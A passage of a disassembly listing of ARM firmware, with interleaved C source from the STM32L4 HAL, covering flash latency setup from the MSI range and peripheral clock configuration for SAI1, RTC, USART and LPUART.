 800460e:	5ccb      	ldrb	r3, [r1, r3]
 8004610:	f003 031f 	and.w	r3, r3, #31
 8004614:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004618:	4618      	mov	r0, r3
 800461a:	bd80      	pop	{r7, pc}
 800461c:	40021000 	.word	0x40021000
 8004620:	0800d3fc 	.word	0x0800d3fc

08004624 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 8004624:	b580      	push	{r7, lr}
 8004626:	b086      	sub	sp, #24
 8004628:	af00      	add	r7, sp, #0
 800462a:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 800462c:	2300      	movs	r3, #0
 800462e:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 8004630:	4b2a      	ldr	r3, [pc, #168]	; (80046dc <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004632:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004634:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004638:	2b00      	cmp	r3, #0
 800463a:	d003      	beq.n	8004644 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 800463c:	f7ff f9a6 	bl	800398c <HAL_PWREx_GetVoltageRange>
 8004640:	6178      	str	r0, [r7, #20]
 8004642:	e014      	b.n	800466e <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 8004644:	4b25      	ldr	r3, [pc, #148]	; (80046dc <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004646:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004648:	4a24      	ldr	r2, [pc, #144]	; (80046dc <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800464a:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800464e:	6593      	str	r3, [r2, #88]	; 0x58
 8004650:	4b22      	ldr	r3, [pc, #136]	; (80046dc <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004652:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004654:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004658:	60fb      	str	r3, [r7, #12]
 800465a:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 800465c:	f7ff f996 	bl	800398c <HAL_PWREx_GetVoltageRange>
 8004660:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 8004662:	4b1e      	ldr	r3, [pc, #120]	; (80046dc <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004664:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004666:	4a1d      	ldr	r2, [pc, #116]	; (80046dc <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004668:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 800466c:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 800466e:	697b      	ldr	r3, [r7, #20]
 8004670:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004674:	d10b      	bne.n	800468e <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 8004676:	687b      	ldr	r3, [r7, #4]
 8004678:	2b80      	cmp	r3, #128	; 0x80
 800467a:	d919      	bls.n	80046b0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 800467c:	687b      	ldr	r3, [r7, #4]
 800467e:	2ba0      	cmp	r3, #160	; 0xa0
 8004680:	d902      	bls.n	8004688 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 8004682:	2302      	movs	r3, #2
 8004684:	613b      	str	r3, [r7, #16]
 8004686:	e013      	b.n	80046b0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004688:	2301      	movs	r3, #1
 800468a:	613b      	str	r3, [r7, #16]
 800468c:	e010      	b.n	80046b0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 800468e:	687b      	ldr	r3, [r7, #4]
 8004690:	2b80      	cmp	r3, #128	; 0x80
 8004692:	d902      	bls.n	800469a <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 8004694:	2303      	movs	r3, #3
 8004696:	613b      	str	r3, [r7, #16]
 8004698:	e00a      	b.n	80046b0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 800469a:	687b      	ldr	r3, [r7, #4]
 800469c:	2b80      	cmp	r3, #128	; 0x80
 800469e:	d102      	bne.n	80046a6 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80046a0:	2302      	movs	r3, #2
 80046a2:	613b      	str	r3, [r7, #16]
 80046a4:	e004      	b.n	80046b0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 80046a6:	687b      	ldr	r3, [r7, #4]
 80046a8:	2b70      	cmp	r3, #112	; 0x70
 80046aa:	d101      	bne.n	80046b0 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80046ac:	2301      	movs	r3, #1
 80046ae:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 80046b0:	4b0b      	ldr	r3, [pc, #44]	; (80046e0 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80046b2:	681b      	ldr	r3, [r3, #0]
 80046b4:	f023 0207 	bic.w	r2, r3, #7
 80046b8:	4909      	ldr	r1, [pc, #36]	; (80046e0 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80046ba:	693b      	ldr	r3, [r7, #16]
 80046bc:	4313      	orrs	r3, r2
 80046be:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 80046c0:	4b07      	ldr	r3, [pc, #28]	; (80046e0 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80046c2:	681b      	ldr	r3, [r3, #0]
 80046c4:	f003 0307 	and.w	r3, r3, #7
 80046c8:	693a      	ldr	r2, [r7, #16]
 80046ca:	429a      	cmp	r2, r3
 80046cc:	d001      	beq.n	80046d2 <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 80046ce:	2301      	movs	r3, #1
 80046d0:	e000      	b.n	80046d4 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 80046d2:	2300      	movs	r3, #0
}
 80046d4:	4618      	mov	r0, r3
 80046d6:	3718      	adds	r7, #24
 80046d8:	46bd      	mov	sp, r7
 80046da:	bd80      	pop	{r7, pc}
 80046dc:	40021000 	.word	0x40021000
 80046e0:	40022000 	.word	0x40022000

080046e4 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 80046e4:	b580      	push	{r7, lr}
 80046e6:	b086      	sub	sp, #24
 80046e8:	af00      	add	r7, sp, #0
 80046ea:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 80046ec:	2300      	movs	r3, #0
 80046ee:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 80046f0:	2300      	movs	r3, #0
 80046f2:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 80046f4:	687b      	ldr	r3, [r7, #4]
 80046f6:	681b      	ldr	r3, [r3, #0]
 80046f8:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80046fc:	2b00      	cmp	r3, #0
 80046fe:	d031      	beq.n	8004764 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 8004700:	687b      	ldr	r3, [r7, #4]
 8004702:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004704:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004708:	d01a      	beq.n	8004740 <HAL_RCCEx_PeriphCLKConfig+0x5c>
 800470a:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800470e:	d814      	bhi.n	800473a <HAL_RCCEx_PeriphCLKConfig+0x56>
 8004710:	2b00      	cmp	r3, #0
 8004712:	d009      	beq.n	8004728 <HAL_RCCEx_PeriphCLKConfig+0x44>
 8004714:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 8004718:	d10f      	bne.n	800473a <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 800471a:	4b5d      	ldr	r3, [pc, #372]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800471c:	68db      	ldr	r3, [r3, #12]
 800471e:	4a5c      	ldr	r2, [pc, #368]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004720:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004724:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004726:	e00c      	b.n	8004742 <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 8004728:	687b      	ldr	r3, [r7, #4]
 800472a:	3304      	adds	r3, #4
 800472c:	2100      	movs	r1, #0
 800472e:	4618      	mov	r0, r3
 8004730:	f000 f9de 	bl	8004af0 <RCCEx_PLLSAI1_Config>
 8004734:	4603      	mov	r3, r0
 8004736:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004738:	e003      	b.n	8004742 <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 800473a:	2301      	movs	r3, #1
 800473c:	74fb      	strb	r3, [r7, #19]
      break;
 800473e:	e000      	b.n	8004742 <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 8004740:	bf00      	nop
    }

    if(ret == HAL_OK)
 8004742:	7cfb      	ldrb	r3, [r7, #19]
 8004744:	2b00      	cmp	r3, #0
 8004746:	d10b      	bne.n	8004760 <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 8004748:	4b51      	ldr	r3, [pc, #324]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800474a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800474e:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 8004752:	687b      	ldr	r3, [r7, #4]
 8004754:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004756:	494e      	ldr	r1, [pc, #312]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004758:	4313      	orrs	r3, r2
 800475a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 800475e:	e001      	b.n	8004764 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004760:	7cfb      	ldrb	r3, [r7, #19]
 8004762:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 8004764:	687b      	ldr	r3, [r7, #4]
 8004766:	681b      	ldr	r3, [r3, #0]
 8004768:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800476c:	2b00      	cmp	r3, #0
 800476e:	f000 809e 	beq.w	80048ae <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 8004772:	2300      	movs	r3, #0
 8004774:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 8004776:	4b46      	ldr	r3, [pc, #280]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004778:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800477a:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800477e:	2b00      	cmp	r3, #0
 8004780:	d101      	bne.n	8004786 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 8004782:	2301      	movs	r3, #1
 8004784:	e000      	b.n	8004788 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 8004786:	2300      	movs	r3, #0
 8004788:	2b00      	cmp	r3, #0
 800478a:	d00d      	beq.n	80047a8 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 800478c:	4b40      	ldr	r3, [pc, #256]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800478e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004790:	4a3f      	ldr	r2, [pc, #252]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004792:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8004796:	6593      	str	r3, [r2, #88]	; 0x58
 8004798:	4b3d      	ldr	r3, [pc, #244]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800479a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800479c:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80047a0:	60bb      	str	r3, [r7, #8]
 80047a2:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 80047a4:	2301      	movs	r3, #1
 80047a6:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80047a8:	4b3a      	ldr	r3, [pc, #232]	; (8004894 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80047aa:	681b      	ldr	r3, [r3, #0]
 80047ac:	4a39      	ldr	r2, [pc, #228]	; (8004894 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80047ae:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80047b2:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 80047b4:	f7fc fdda 	bl	800136c <HAL_GetTick>
 80047b8:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80047ba:	e009      	b.n	80047d0 <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 80047bc:	f7fc fdd6 	bl	800136c <HAL_GetTick>
 80047c0:	4602      	mov	r2, r0
 80047c2:	68fb      	ldr	r3, [r7, #12]
 80047c4:	1ad3      	subs	r3, r2, r3
 80047c6:	2b02      	cmp	r3, #2
 80047c8:	d902      	bls.n	80047d0 <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 80047ca:	2303      	movs	r3, #3
 80047cc:	74fb      	strb	r3, [r7, #19]
        break;
 80047ce:	e005      	b.n	80047dc <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80047d0:	4b30      	ldr	r3, [pc, #192]	; (8004894 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80047d2:	681b      	ldr	r3, [r3, #0]
 80047d4:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80047d8:	2b00      	cmp	r3, #0
 80047da:	d0ef      	beq.n	80047bc <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 80047dc:	7cfb      	ldrb	r3, [r7, #19]
 80047de:	2b00      	cmp	r3, #0
 80047e0:	d15a      	bne.n	8004898 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 80047e2:	4b2b      	ldr	r3, [pc, #172]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047e4:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80047e8:	f403 7340 	and.w	r3, r3, #768	; 0x300
 80047ec:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 80047ee:	697b      	ldr	r3, [r7, #20]
 80047f0:	2b00      	cmp	r3, #0
 80047f2:	d01e      	beq.n	8004832 <HAL_RCCEx_PeriphCLKConfig+0x14e>
 80047f4:	687b      	ldr	r3, [r7, #4]
 80047f6:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 80047f8:	697a      	ldr	r2, [r7, #20]
 80047fa:	429a      	cmp	r2, r3
 80047fc:	d019      	beq.n	8004832 <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 80047fe:	4b24      	ldr	r3, [pc, #144]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004800:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004804:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8004808:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 800480a:	4b21      	ldr	r3, [pc, #132]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800480c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004810:	4a1f      	ldr	r2, [pc, #124]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004812:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004816:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 800481a:	4b1d      	ldr	r3, [pc, #116]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800481c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004820:	4a1b      	ldr	r2, [pc, #108]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004822:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004826:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 800482a:	4a19      	ldr	r2, [pc, #100]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800482c:	697b      	ldr	r3, [r7, #20]
 800482e:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 8004832:	697b      	ldr	r3, [r7, #20]
 8004834:	f003 0301 	and.w	r3, r3, #1
 8004838:	2b00      	cmp	r3, #0
 800483a:	d016      	beq.n	800486a <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 800483c:	f7fc fd96 	bl	800136c <HAL_GetTick>
 8004840:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004842:	e00b      	b.n	800485c <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004844:	f7fc fd92 	bl	800136c <HAL_GetTick>
 8004848:	4602      	mov	r2, r0
 800484a:	68fb      	ldr	r3, [r7, #12]
 800484c:	1ad3      	subs	r3, r2, r3
 800484e:	f241 3288 	movw	r2, #5000	; 0x1388
 8004852:	4293      	cmp	r3, r2
 8004854:	d902      	bls.n	800485c <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 8004856:	2303      	movs	r3, #3
 8004858:	74fb      	strb	r3, [r7, #19]
            break;
 800485a:	e006      	b.n	800486a <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800485c:	4b0c      	ldr	r3, [pc, #48]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800485e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004862:	f003 0302 	and.w	r3, r3, #2
 8004866:	2b00      	cmp	r3, #0
 8004868:	d0ec      	beq.n	8004844 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 800486a:	7cfb      	ldrb	r3, [r7, #19]
 800486c:	2b00      	cmp	r3, #0
 800486e:	d10b      	bne.n	8004888 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 8004870:	4b07      	ldr	r3, [pc, #28]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004872:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004876:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 800487a:	687b      	ldr	r3, [r7, #4]
 800487c:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800487e:	4904      	ldr	r1, [pc, #16]	; (8004890 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004880:	4313      	orrs	r3, r2
 8004882:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 8004886:	e009      	b.n	800489c <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 8004888:	7cfb      	ldrb	r3, [r7, #19]
 800488a:	74bb      	strb	r3, [r7, #18]
 800488c:	e006      	b.n	800489c <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 800488e:	bf00      	nop
 8004890:	40021000 	.word	0x40021000
 8004894:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004898:	7cfb      	ldrb	r3, [r7, #19]
 800489a:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 800489c:	7c7b      	ldrb	r3, [r7, #17]
 800489e:	2b01      	cmp	r3, #1
 80048a0:	d105      	bne.n	80048ae <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80048a2:	4b8a      	ldr	r3, [pc, #552]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048a4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80048a6:	4a89      	ldr	r2, [pc, #548]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048a8:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80048ac:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 80048ae:	687b      	ldr	r3, [r7, #4]
 80048b0:	681b      	ldr	r3, [r3, #0]
 80048b2:	f003 0301 	and.w	r3, r3, #1
 80048b6:	2b00      	cmp	r3, #0
 80048b8:	d00a      	beq.n	80048d0 <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 80048ba:	4b84      	ldr	r3, [pc, #528]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048bc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048c0:	f023 0203 	bic.w	r2, r3, #3
 80048c4:	687b      	ldr	r3, [r7, #4]
 80048c6:	6a1b      	ldr	r3, [r3, #32]
 80048c8:	4980      	ldr	r1, [pc, #512]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048ca:	4313      	orrs	r3, r2
 80048cc:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 80048d0:	687b      	ldr	r3, [r7, #4]
 80048d2:	681b      	ldr	r3, [r3, #0]
 80048d4:	f003 0302 	and.w	r3, r3, #2
 80048d8:	2b00      	cmp	r3, #0
 80048da:	d00a      	beq.n	80048f2 <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 80048dc:	4b7b      	ldr	r3, [pc, #492]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048de:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048e2:	f023 020c 	bic.w	r2, r3, #12
 80048e6:	687b      	ldr	r3, [r7, #4]
 80048e8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80048ea:	4978      	ldr	r1, [pc, #480]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048ec:	4313      	orrs	r3, r2
 80048ee:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 80048f2:	687b      	ldr	r3, [r7, #4]
 80048f4:	681b      	ldr	r3, [r3, #0]
 80048f6:	f003 0320 	and.w	r3, r3, #32
 80048fa:	2b00      	cmp	r3, #0
 80048fc:	d00a      	beq.n	8004914 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 80048fe:	4b73      	ldr	r3, [pc, #460]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004900:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004904:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 8004908:	687b      	ldr	r3, [r7, #4]
 800490a:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800490c:	496f      	ldr	r1, [pc, #444]	; (8004acc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800490e:	4313      	orrs	r3, r2
 8004910:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
